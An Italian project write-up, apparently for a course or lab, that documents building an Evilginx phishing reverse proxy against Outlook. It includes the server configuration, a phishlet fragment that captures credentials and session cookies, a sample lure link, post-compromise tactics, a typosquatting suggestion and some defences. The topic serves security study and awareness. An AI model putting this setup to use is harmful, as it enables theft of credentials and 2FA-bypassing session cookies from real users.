# Phishing Proxy (Evilginx) per Ottenere Credenziali ed Accesso su Outlook
Per il seguente progetto è stato utilizzato:
- un server su cui è stato installato e fatto girare Evilginx (localizzato a San Francisco con IP: `161.35.234.65`), accedibile attraverso SSH
- dominio falso comprato su Aruba: `maybesteam.cloud`
- Github.com per la clonazione delle repository necessarie
## Evilginx
![](https://abnormalsecurity.com/_next/image?url=https%3A%2F%2Fimages.abnormalsecurity.com%2Fproduction%2Fimages%2Fblog%2FEvilginx1.png%3Fw%3D1536%26h%3D484%26auto%3Dcompress%252Cformat%26fit%3Dcrop%26dm%3D1726590093%26s%3D060aaf1b714dac742a980e8e1ae67476&w=1920&q=75)
Evilginx è uno strumento open-source per attacchi di phishing avanzati tramite reverse proxy. Viene utilizzato per intercettare il traffico tra l'utente e un sito legittimo, catturando credenziali e token di sessione senza compromettere il dispositivo della vittima.

Evilginx funziona come un proxy tra l'utente e il servizio autentico, inoltrando richieste e risposte in tempo reale. In questo modo, può aggirare l’autenticazione a più fattori (2FA) rubando i cookie di sessione.

Sebbene sia spesso utilizzato a scopo didattico e per test di sicurezza (Red Teaming), il suo utilizzo non autorizzato è illegale.

>### Avvertenze
>
>Inizialmente il progetto prevedeva di rubare le credenziali di Steam, motivo per cui il dominio utilizzato è **maybesteam.cloud**. Tuttavia, a causa di problemi con i Phishlet, questa idea è stata abbandonata. Si è deciso quindi di lavorare su Outlook. L'ideale sarebbe stato ottenere un nuovo dominio, come ad esempio **maybeoutlook.com** oppure, ancor meglio, **outloook.com**.

Per prima cosa bisogna configurare Evilginx come reverse proxy, operazione che può essere eseguita sia tramite CLI che manualmente, entrando nel file `config.json`.

```json
"general": {
    "autocert": true,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "maybesteam.cloud", #dominio falso
    "external_ipv4": "161.35.234.65", #ip del server dell'attaccante
    "https_port": 443,
    "ipv4": "",
    "unauth_url": ""
  },
  ```

Evilginx, cuore pulsante del progetto, ha una struttura modulare composta principalmente da:

### 1. Phishlet (tradotto "ficcanaso")

I **Phishlet** sono piccoli file di configurazione, utilizzati per configurare Evilginx per obiettivi di phishing su siti web specifici. Ogni phishlet deve essere creato ad hoc per il sito web su cui si vuole lavorare. È nel phishlet che vengono descritte le informazioni da catturare e gli URL da gestire. Il problema con Steam è stato che, visto che la creazione di un Phishlet è considerata un’arte a sé, avrebbe richiesto un impegno e una quantità di tempo troppo elevata. Bisognerebbe studiare l'intero processo di login per ottenere una descrizione completa dei vari reindirizzamenti che avvengono.

Per il progetto, si è preferito sfruttare Phishlet già pronti e disponibili in rete, come quello relativo ad Outlook.

Per impostazione predefinita, i phishlet si trovano nella directory `phishlets` nella root directory di Evilginx, che va specificata come parametro di avvio.

Phishlet utilizzato:
```yaml
name: 'Outlook'
author: '@simplerhacking'
min_ver: '3.0.0'
proxy_hosts:
  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  ...
  ... #per un totale di 17 proxy hosts
  ...
```

Per quanto rigaurda i parametri da rubare:
```
username:
    key: ""
    search: '"username":"([^"]*)'
    type: "json"
  password:
    key: ""
    search: '"password":"([^"]*)'
    type: "json"
```
e i cookie di sessione:
```
auth_tokens:                                                                                                                                          - domain: 'login.live.com'                                                                                                                            keys: ['uaid','MSPRequ','MSCC','MSPOK','__Host-MSAAUTHP','MSPPre','MSPCID','MSPAuth','MSPProf','NAP','ANON','WLSSC','SDIDC','JSHP','JSH','MSPSo>  - domain: 'live.com'                                                                                                                                  keys: ['ai_session','wlidperf','PPLState','WLSSC','RPSSecAuth','MSPCID','MSPAuth','MSPProf','NAP','ANON','.*,regexp']                             - domain: '.login.microsoftonline.com'                                                                                                                keys: ['ESTSAUTH','ESTSAUTHPERSISTENT','SignInStateCookie','esctx','ESTSSC','ESTSAUTHLIGHT','stsservicecookie','x-ms-gateway-slice', '.*,regexp>  - domain: 'login.microsoftonline.com'
    keys: ['ESTSSC','ESTSAUTHLIGHT','stsservicecookie','x-ms-gateway-slice', '.*,regexp']
  - domain: 'outlook.live.com'
    keys: ['DefaultAnchorMailbox', 'UC', 'OutlookSession', 'X-OWA-CANARY', '.*,regexp']
```
### 2. Reverse Proxy

Il **Reverse Proxy** svolge le seguenti funzioni:

- Instrada il traffico tra la vittima e il sito legittimo.
- Intercetta:
  - Credenziali (nome utente, password)
  - Cookie di sessione (per il bypass dell’autenticazione 2FA)
- Risponde trasparentemente, rendendo difficile il rilevamento.

Una volta configurato correttamente, si abilita il Phishlet e si aspetta che vengano generati i certificati TLS per ogni sottodominio coinvolto. Nel caso di Outlook, il phishlet dedicato richiedeva 17 certificati TLS, il che ha comportato la creazione di 17 sottodomini diversi con lo stesso nome del sito legittimo, assegnandoli allo stesso indirizzo IP, quello del server dell'attaccante.

### Lures (tradotto "esca")

Una volta abilitato il Phishlet, si passa alla creazione del o dei **Lures**.
I **Lures** sono sostanzialmente link di phishing pre-generati, che verranno inviati durante l'attacco. Evilginx offre diverse opzioni per personalizzare i propri Lures. 
La forza dei Lures risiede nel fatto che sono costruiti a partire dal dominio dell'attaccante, e quindi sembrano verosimilmente un URL legittimo.

`https://outlook.maybesteam.cloud/sisdXQSx`

## Attacco

L'attaccante invia il Lure tramite un qualsiasi strumento di comunicazione, come ad esempio WhatsApp o Telegram. La vittima esegue un normale login al proprio account Outlook e non si accorge del furto delle credenziali, con o senza 2FA.

Una volta che la vittima ha completato il login, Evilginx avrà ottenuto email, password ed eventuali cookie di sessione dovuti al 2FA. L'attaccante può utilizzare queste informazioni a suo piacimento.
## Cosa può fare l'attaccante
L'informazione rubata più importante è sicuramente rappresentata dai cookie di sessione, poichè bastano quelli, inseriti all'interno di un Cookie-Editor, per poter entrare all'interno della casella postale.
Comunque sia, una volta ottenuto l'email, la password e i cookie di sessione, l'attaccante può:
### 1. Prendere il controllo dell'account

- **Modifica delle credenziali**: Cambiare la password e l'email di recupero per escludere il legittimo proprietario, a patto che l'email di conferma arrivi nella stessa casella postale.
- **Attivazione dell’autenticazione a due fattori (2FA)**: Paradossalmente, per impedire al vero utente di riprendere il controllo.

### 2. Esplorare risorse sensibili

- **Accesso a e-mail e file riservati**: Se l'account è aziendale, l'attaccante può ottenere documenti, report e informazioni strategiche.
- **Consultare chat e cronologie**: Per raccogliere informazioni su progetti, clienti o colleghi.

### 3. Lateral Movement

- **Utilizzare l’account per phishing interno**: Inviare e-mail truffa a colleghi o partner usando l'account compromesso.
- **Accedere ad altri servizi collegati (SSO)**: L'attaccante può entrare in piattaforme aziendali collegate tramite il token di sessione.
- **Accedere altrove**: Sebbene sia una tecnica a tentativi,  l'attaccante può tentare di accedere utilizzando le stesse credenziali rubate, all'interno di altre piattaforme web (Facebook, Gmail, etc...) a patto che non sia abilitato il 2FA, visto che i cookie di sessione reubati sono utili solo per Outlook, e che la vittima utilizzi le stesse credenziali per vari servizi.


### 4. Creare persistenza

- **Generare token di accesso secondari**: Per mantenere l'accesso anche dopo il cambio della password.
- **Impostare filtri su e-mail**: Per nascondere notifiche o avvisi al proprietario dell'account.
## Difendersi da un attacco di questo tipo

Le difese sono molteplici e su vari livelli:

### 1. Browser

Eseguendo prove su vari browser, Google Chrome è stato l'unico che, cliccando sul Lure, ha reindirizzato la vittima a una pagina di avviso. Questa pagina dovrebbe essere già un segnale evidente di un'azione dannosa per la propria sicurezza.

### 2. Password Manager

Un qualsiasi **password manager** non si attiverebbe al momento del login visto che non riconoscerebbe l'URL del Lure da quello legittimo di Outlook.

### 3. Adottare Protezioni Lato Server e Aziendali
Come ad esmpio abilitando funzionalità anti-replay (limitando l’uso di token di sessione) o implementando SameSite cookies per impedire il furto dei cookie tramite proxy.

### 4. Formazione

Formare gli utenti su phishing e tecniche di attacco, insegnando loro a identificare siti falsi e segnali di attacchi man-in-the-middle.

### 5. 2FA

Non tutti i tipi di 2FA sono efficaci contro Evilginx. L'utilizzo di un normale 2FA è praticamente inutile, poiché i cookie di sessione rubati bastano per aggirare il 2FA. L'eccezione è il nuovo tipo di accesso sviluppato da Microsoft, che prevede l'accesso senza password. Durante il login verrà richiesta solo l'email, seguita da una conferma tramite una notifica telefonica (codice, impronta digitale, ecc.). Anche se Evilginx ruberà comunque i cookie di sessione, non otterrà la password della vittima, ma solo l'email. Sebbene l'attaccante riesca comunque ad entrare, non ottiene la password come informazione per poter fare altro.
## Difficoltà incontrate durante lo sviluppo
Le difficoltà sono dovute, non tanto alla quantità di documentazione disponibile per Evilginx, quanto alla qualità e alla disponibilità di sviluppi già fatti. Infatti, è stato molto difficile trovare un Phishlet già pronto, motivo per cui l'idea di sfruttare Steam è stata bidonata per mancanza di Phishlet aggiornati. Doveroso menzionare tutta la parte dei certificati TLS, è stato complicato capire che bisognava avere un sottodominio per ogni `proxy_host`, in modo tale che Evilginx potesse richeidere i certificati. Inoltre, una volta che il sottodominio veniva creato, non si poteva porcedere a testare l'ambiente siccome il DNS impiegava qualche ora a propagare il nuovo indirizzo
## Possibili miglioramenti o sviluppi
Come primo miglioramento, sicuramente l'utilizzo di un differente falso dominio, come ad esempio outloook.com (tre 'o') proporrebbe un Lure meno sospettoso.
Sviluppi d'interesse invece, starebbero nello studio di nuovi Phishlets, poichè un Phishlet ben costruito, permette l'accesso ad un qualsiasi sito web di questa tipologia. Esempi interessanti sarebbero: Steam (furto di in-game Item dal valore non indifferente), PayPal (possibilità di acquisto online), un qualsiasi servizio di cloud storaging come Google Drive, Mega etc... (file sensibili o d'interesse)
## Bibliografia

- Evilginx, *build, deploy & execute*. https://help.evilginx.com/community 
- kgretzky, *Evilginx 3.0*. https://github.com/kgretzky/evilginx2
- An0nUD4Y, *Phishlets*. https://github.com/An0nUD4Y/Evilginx2-Phishlets
- ArchonLabs, *Phishlets*. https://github.com/ArchonLabs/evilginx2-phishlets





